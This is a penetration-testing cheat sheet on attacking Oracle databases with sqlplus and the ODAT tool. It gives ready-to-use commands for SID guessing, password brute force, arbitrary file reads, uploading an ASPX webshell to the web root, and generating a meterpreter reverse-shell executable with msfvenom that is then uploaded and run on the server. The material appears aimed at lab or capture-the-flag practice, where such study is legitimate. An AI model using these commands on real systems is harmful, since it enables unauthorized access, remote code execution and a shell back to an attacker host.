---
title: "Oracle Database"
date: 2024-7-5
tags: ["oracle", "database", "1521", "sqlplus", "odat", "revshell", "rce"]
---

---
### Tools

#### sqlplus

```bash
# Install
sudo apt install oracle-instantclient-sqlplus
```

```bash
# export LD_LIBRARY_PATH
export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
```

```bash
# Check
sqlplus -V
```

#### ODAT (Oracle Database Attacking Tool)

[Download ODAT](https://github.com/quentinhardy/odat)

```bash
# Install
sudo apt install odat
```

```bash
# Check
odat --version
```

<br>

---

### Enum

```bash
# SID enum (You only need one)
odat sidguesser -s 10.10.11.10
```

```bash
# User/Password brute force
odat passwordguesser -s 10.10.11.10 -d <SID> --accounts-file accounts.txt
```

```bash
# Run all checks with creds as sysdba
odat all -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba
```

### General

```bash
# Export everytime or add to ~/.zshrc
export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
```

```bash
# Connect
sqlplus <USER>/<PASSWORD>@10.10.11.10:1521/<SID>
```

```bash
# Connect as sysdba (sudo)
sqlplus <USER>/<PASSWORD>@10.10.11.10:1521/<SID> as sysdba
```

```bash
# Check privilege
select * from user_role_privs;
```

<br>

---
#### Abuse #1: Arbitrary Read

```bash
odat ctxsys -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --getFile c:\\users\\administrator\\desktop\\file.txt
```

#### Upload File to RCE

```bash
odat dbmsadvisor -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
```

#### Execute binary to RCE

```bash
# Create a malicious exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o revshell.exe
```

```bash
# Upload
odat utlfile -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --putFile \\Temp revshell.exe revshell.exe
```

```bash
# Execute
odat externaltable -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --exec \\Temp revshell.exe
```

<br>